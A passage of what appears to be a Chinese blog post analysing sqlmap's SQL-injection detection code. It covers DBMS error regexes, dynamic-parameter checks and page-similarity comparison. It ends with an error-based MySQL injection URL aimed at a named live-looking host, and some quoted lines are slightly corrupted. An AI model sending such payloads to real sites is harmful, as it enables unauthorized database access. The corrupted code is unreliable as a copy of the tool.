<span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;OLE DB.* SQL Server&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;(\W|\A)SQL Server.*Driver&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*mssql_.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;(\W|\A)SQL Server.*[0-9a-fA-F]&#123;8&#125;&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Exception Details:.*\WSystem\.Data\.SqlClient\.&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Exception Details:.*\WRoadhouse\.Cms\.&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Microsoft Access --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Microsoft Access&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Microsoft Access Driver&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;JET Database Engine&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Access Database Engine&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Oracle --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Oracle&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;ORA-[0-9][0-9][0-9][0-9]&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Oracle error&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Oracle.*Driver&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*\Woci_.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*\Wora_.*&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- DB2 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;DB2&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;CLI Driver.*DB2&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;DB2 SQL error&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Informix --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Informix&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Exception.*Informix&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Interbase/Firebird --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Firebird&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Dynamic SQL Error&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*ibase_.*&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- SQLite --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;SQLite&quot;</span>&gt;</span>AND &#x27;[RANDSTR]&#x27;=&#x27;[RANDSTR]<br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;SQLite/JDBCDriver&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;SQLite.Exception&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;System.Data.SQLite.SQLiteException&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*sqlite_.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*SQLite3::&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- SAP MaxDB --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;SAP MaxDB&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;SQL error.*POS([0-9]+).*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*maxdb.*&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Sybase --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Sybase&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*sybase.*&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Sybase message&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Sybase.*Server message.*&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br>    <span class="hljs-comment">&lt;!-- Ingres --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dbms</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Ingres&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Warning.*ingres_&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Ingres SQLSTATE&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">error</span> <span class="hljs-attr">regexp</span>=<span class="hljs-string">&quot;Ingres\W.*Driver&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dbms</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>更详细地需要DBMS fingerprint 识别技术</p>
<h2 id="检测SQL-Injection-的报文"><a href="#检测SQL-Injection-的报文" class="headerlink" title="检测SQL Injection 的报文"></a>检测SQL Injection 的报文</h2><ol>
<li>检查参数是否动态</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">checkDynParam</span>(<span class="hljs-params">place, parameter, value</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    This function checks if the url parameter is dynamic. If it is</span><br><span class="hljs-string">    dynamic, the content of the page differs, otherwise the</span><br><span class="hljs-string">    dynamicity might depend on another parameter.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    kb.matchRatio = <span class="hljs-literal">None</span><br><br>    infoMsg = <span class="hljs-string">&quot;testing if %s parameter &#x27;%s&#x27; is dynamic&quot;</span> % (place, parameter)<br>    logger.info(infoMsg)<br><br>    <span class="hljs-comment"># 生成一个随机字符串</span><br>    randInt = randomInt()<br>    payload = agent.payload(place, parameter, value, getUnicode(randInt))<br>    logger.debug(<span class="hljs-string">&quot;checkDynParam: %s&quot;</span>, payload)<br>    dynResult = Request.queryPage(payload, place, raise404=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-comment"># 如果和原先页面一样，不是动态参数</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-literal">True</span> == dynResult:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    infoMsg = <span class="hljs-string">&quot;confirming that %s parameter &#x27;%s&#x27; is dynamic&quot;</span> % (place, parameter)<br>    logger.info(infoMsg)<br>    <span class="hljs-comment"># 再次检查，确认</span><br>    randInt = randomInt()<br>    payload = agent.payload(place, parameter, value, getUnicode(randInt))<br>    dynResult = Request.queryPage(payload, place, raise404=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> dynResult<br></code></pre></td></tr></table></figure>

<ol start="2">
<li><p>启发式检测，长度为10的 “,’, ), ( 随机字符串， 使用python RandomStr, 如果发生已知错误，报可能存在sql injection， 可能的数据库</p>
</li>
<li><p>基于risk 和 level的级别，使用payloads.xml中的报文进行检测</p>
</li>
<li><p>判断url连接是否稳定，连续连接url两次，如果返回内容完全相同，则认为url稳定。</p>
</li>
<li><p>NullConnection <a target="_blank" rel="noopener" href="http://www.wisec.it/sectou.php?id=472f952d79293">http://www.wisec.it/sectou.php?id=472f952d79293</a></p>
</li>
</ol>
<h2 id="怎么判断injected-payload-成功"><a href="#怎么判断injected-payload-成功" class="headerlink" title="怎么判断injected payload 成功"></a>怎么判断injected payload 成功</h2><h3 id="comparison-算法，-boolean-based-blind-SQL-injections"><a href="#comparison-算法，-boolean-based-blind-SQL-injections" class="headerlink" title="comparison 算法， boolean-based blind SQL injections"></a>comparison 算法， boolean-based blind SQL injections</h3><p>使用 difflib.SequenceMatcher, 基于页面相似度如果请求发生错误，所有不正确的请求都认为正确。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">comparison</span>(<span class="hljs-params">page, getRatioValue=<span class="hljs-literal">False</span>, pageLength=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> page <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> pageLength <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    regExpResults = <span class="hljs-literal">None</span><br><br>    seqMatcher = getCurrentThreadData().seqMatcher<br>    <span class="hljs-comment">#logger.debug(kb.pageTemplate)</span><br>    seqMatcher.set_seq1(kb.pageTemplate)<br><br>    <span class="hljs-keyword">if</span> page:<br>        <span class="hljs-comment"># String to match in page when the query is valid</span><br>        <span class="hljs-comment">#a.1 如果出现指定字符串，返回True</span><br>        <span class="hljs-keyword">if</span> conf.string:<br>            condition = conf.string <span class="hljs-keyword">in</span> page<br>            <span class="hljs-keyword">return</span> condition <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> getRatioValue <span class="hljs-keyword">else</span> (MAX_RATIO <span class="hljs-keyword">if</span> condition <span class="hljs-keyword">else</span> MIN_RATIO)<br><br>        <span class="hljs-comment"># Regular expression to match in page when the query is valid</span><br>        <span class="hljs-comment"># a.2 如果出现指定正则表达式，返回Ture</span><br>        <span class="hljs-keyword">if</span> conf.regexp:<br>            condition = re.search(conf.regexp, page, re.I | re.M) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span><br>            <span class="hljs-keyword">return</span> condition <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> getRatioValue <span class="hljs-keyword">else</span> (MAX_RATIO <span class="hljs-keyword">if</span> condition <span class="hljs-keyword">else</span> MIN_RATIO)<br><br>        <span class="hljs-comment"># In case of an DBMS error page return None</span><br>        <span class="hljs-keyword">if</span> kb.errorIsNone <span class="hljs-keyword">and</span> (wasLastRequestDBMSError() <span class="hljs-keyword">or</span> wasLastRequestHTTPError()):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>        <span class="hljs-comment"># Dynamic content lines to be excluded before comparison</span><br>        <span class="hljs-comment"># a.4 比较前先将两个页面的动态内容移除</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> kb.nullConnection:<br>            page = removeDynamicContent(page)<br>            seqMatcher.set_seq1(removeDynamicContent(kb.pageTemplate))<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> pageLength:<br>            pageLength = <span class="hljs-built_in">len</span>(page)<br><br>    <span class="hljs-comment"># 连接发生错误</span><br>    <span class="hljs-keyword">if</span> kb.nullConnection <span class="hljs-keyword">and</span> pageLength:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> seqMatcher.a:<br>            errMsg = <span class="hljs-string">&quot;problem occured while retrieving original page content &quot;</span><br>            errMsg += <span class="hljs-string">&quot;which prevents sqlmap from continuation. please rerun, &quot;</span><br>            errMsg += <span class="hljs-string">&quot;and if problem persists please turn off optimization switches&quot;</span><br>            <span class="hljs-keyword">raise</span> sqlmapNoneDataException, errMsg<br><br>        ratio = <span class="hljs-number">1.</span> * pageLength / <span class="hljs-built_in">len</span>(seqMatcher.a)<br><br>        <span class="hljs-keyword">if</span> ratio &gt; <span class="hljs-number">1.</span>:<br>            ratio = <span class="hljs-number">1.</span> / ratio<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 正常连接情况, 判断是否使用textOnly命令行参数</span><br>        seqMatcher.set_seq1(getFilteredPageContent(seqMatcher.a, <span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> conf.textOnly <span class="hljs-keyword">else</span> seqMatcher.a)<br>        seqMatcher.set_seq2(getFilteredPageContent(page, <span class="hljs-literal">True</span>) <span class="hljs-keyword">if</span> conf.textOnly <span class="hljs-keyword">else</span> page)<br>        <span class="hljs-comment"># float 3 digits</span><br>        ratio = <span class="hljs-built_in">round</span>(seqMatcher.quick_ratio(), <span class="hljs-number">3</span>)<br>        logger.debug(<span class="hljs-string">&#x27;ratio: %s&#x27;</span> % ratio)<br><br>    <span class="hljs-comment"># If the url is stable and we did not set yet the match ratio and the</span><br>    <span class="hljs-comment"># current injected value changes the url page content</span><br>    <span class="hljs-keyword">if</span> kb.matchRatio <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> kb.pageStable <span class="hljs-keyword">and</span> ratio &gt;= LOWER_RATIO_BOUND <span class="hljs-keyword">and</span> ratio &lt;= UPPER_RATIO_BOUND:<br>            kb.matchRatio = ratio<br>            logger.debug(<span class="hljs-string">&quot;setting match ratio for current parameter to %.3f&quot;</span> % kb.matchRatio)<br><br>        <span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> kb.pageStable:<br>            <span class="hljs-comment"># CONSTANT_RATIO = 0.900</span><br>            kb.matchRatio = CONSTANT_RATIO<br>            logger.debug(<span class="hljs-string">&quot;setting match ratio for current parameter to default value 0.900&quot;</span>)<br><br>    <span class="hljs-comment"># If it has been requested to return the ratio and not a comparison</span><br>    <span class="hljs-comment"># response</span><br>    <span class="hljs-keyword">if</span> getRatioValue:<br>        <span class="hljs-keyword">return</span> ratio<br>    <br>    <span class="hljs-comment"># ratio &gt; 0.98, 认为两个页面一样</span><br>    <span class="hljs-keyword">elif</span> ratio &gt; UPPER_RATIO_BOUND:  <br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">elif</span> kb.matchRatio <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># url 不稳定</span><br>        <span class="hljs-keyword">if</span> kb.matchRatio == CONSTANT_RATIO:<br>            <span class="hljs-keyword">return</span> ratio &gt; kb.matchRatio<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># DIFF_TOLERANCE = 0.05  magic number</span><br>            <span class="hljs-keyword">return</span> (ratio - kb.matchRatio) &gt; DIFF_TOLERANCE<br><br><br>移除动态内容<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">removeDynamicContent</span>(<span class="hljs-params">page</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Removing dynamic content from supplied page basing removal on</span><br><span class="hljs-string">    precalculated dynamic markings</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> page:<br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> kb.dynamicMarkings:<br>            prefix, suffix = item<br><br>            <span class="hljs-keyword">if</span> prefix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> suffix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                <span class="hljs-keyword">continue</span><br>            <span class="hljs-keyword">elif</span> prefix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<span class="hljs-literal">None</span><br>                page = getCompiledRegex(<span class="hljs-string">&#x27;(?s)^.+%s&#x27;</span> % suffix).sub(suffix, page)<br>            <span class="hljs-keyword">elif</span> suffix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                page = getCompiledRegex(<span class="hljs-string">&#x27;(?s)%s.+$&#x27;</span> % prefix).sub(prefix, page)<br>            <span class="hljs-keyword">else</span>:<br>                page = getCompiledRegex(<span class="hljs-string">&#x27;(?s)%s.+%s&#x27;</span> % (prefix, suffix)).sub(<span class="hljs-string">&#x27;%s%s&#x27;</span> % (prefix, suffix), page)<br><br>    <span class="hljs-keyword">return</span> page<br><br><span class="hljs-comment"># 查找动态内容</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">findDynamicContent</span>(<span class="hljs-params">firstPage, secondPage</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    This function checks if the provided pages have dynamic content. If they</span><br><span class="hljs-string">    are dynamic, proper markings will be made</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    infoMsg = <span class="hljs-string">&quot;searching for dynamic content&quot;</span><br>    logger.info(infoMsg)<br><br>    <span class="hljs-comment"># 返回匹配的内容</span><br>    blocks = SequenceMatcher(<span class="hljs-literal">None</span>, firstPage, secondPage).get_matching_blocks()<br>    kb.dynamicMarkings = []<br><br>    <span class="hljs-comment"># Removing too small matching blocks</span><br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(blocks):<br>        block = blocks[i]<br>        (_, _, length) = block<br><br>	<span class="hljs-comment"># DYNAMICITY_MARK_LENGTH = 32</span><br>        <span class="hljs-keyword">if</span> length &lt;= DYNAMICITY_MARK_LENGTH:<br>            blocks.remove(block)<br><br>        <span class="hljs-keyword">else</span>:<br>            i += <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># Making of dynamic markings based on prefix/suffix principle</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(blocks) &gt; <span class="hljs-number">0</span>:<br><br>	<span class="hljs-comment"># 在blocks的前后添加None</span><br>        blocks.insert(<span class="hljs-number">0</span>, <span class="hljs-literal">None</span>)<br>        blocks.append(<span class="hljs-literal">None</span>)<br>	<br>	<span class="hljs-comment"># </span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(blocks) - <span class="hljs-number">1</span>):<br>            prefix = firstPage[blocks[i][<span class="hljs-number">0</span>]:blocks[i][<span class="hljs-number">0</span>] + blocks[i][<span class="hljs-number">2</span>]] <span class="hljs-keyword">if</span> blocks[i] <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>            suffix = firstPage[blocks[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>]:blocks[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>] + blocks[i + <span class="hljs-number">1</span>][<span class="hljs-number">2</span>]] <span class="hljs-keyword">if</span> blocks[i + <span class="hljs-number">1</span>] <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><br>            <span class="hljs-keyword">if</span> prefix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> blocks[i + <span class="hljs-number">1</span>][<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> suffix <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> (blocks[i][<span class="hljs-number">0</span>] + blocks[i][<span class="hljs-number">2</span>] &gt;= <span class="hljs-built_in">len</span>(firstPage)):<br>                <span class="hljs-keyword">continue</span><br><br>	    <span class="hljs-comment"># 去掉字符串头和尾的字母和数字</span><br>            prefix = trimAlphaNum(prefix)<br>            suffix = trimAlphaNum(suffix)<br><br>            kb.dynamicMarkings.append((re.escape(prefix[-DYNAMICITY_MARK_LENGTH/<span class="hljs-number">2</span>:]) <span class="hljs-keyword">if</span> prefix <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>, re.escape(suffix[:DYNAMICITY_MARK_LENGTH/<span class="hljs-number">2</span>]) <span class="hljs-keyword">if</span> suffix <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span>))<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(kb.dynamicMarkings) &gt; <span class="hljs-number">0</span>:<br>        infoMsg = <span class="hljs-string">&quot;dynamic content marked for removal (%d region%s)&quot;</span> % (<span class="hljs-built_in">len</span>(kb.dynamicMarkings), <span class="hljs-string">&#x27;s&#x27;</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(kb.dynamicMarkings) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;&#x27;</span>)<br>        logger.info(infoMsg)<br></code></pre></td></tr></table></figure>


<h3 id="grep-正则表达式-，-error-based-SQL-injection-可以检查"><a href="#grep-正则表达式-，-error-based-SQL-injection-可以检查" class="headerlink" title="grep(正则表达式)， error-based SQL injection, 可以检查"></a>grep(正则表达式)， error-based SQL injection, 可以检查</h3><p>MS SQL server， Oracle， Mysql等，使用的语句，使用随机字符串查询，如果返回结果的body，或者头部信息中包含我们构造的随机字符串，则认为存在漏洞.具体数据可以使用sqlmap, payloads.xml，例子:</p>
<h4 id="MySQL-5-0-AND-error-based-WHERE-or-HAVING-clause"><a href="#MySQL-5-0-AND-error-based-WHERE-or-HAVING-clause" class="headerlink" title="MySQL &gt;&#x3D; 5.0 AND error-based - WHERE or HAVING clause"></a>MySQL &gt;&#x3D; 5.0 AND error-based - WHERE or HAVING clause</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://to.goojje.com/qunba.php?ac=thread_qb&amp;tid=9136%20AND%20(SELECT%209066%20FROM(SELECT%20COUNT(*),CONCAT(CHAR(58,106,108,98,58),(MID((IFNULL(CAST(VERSION()%20AS%20CHAR),CHAR(32))),1,50)),CHAR(58,108,112,108,58),FLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)<br></code></pre></td></tr></table></figure>

<p>urldecode 后：</p>
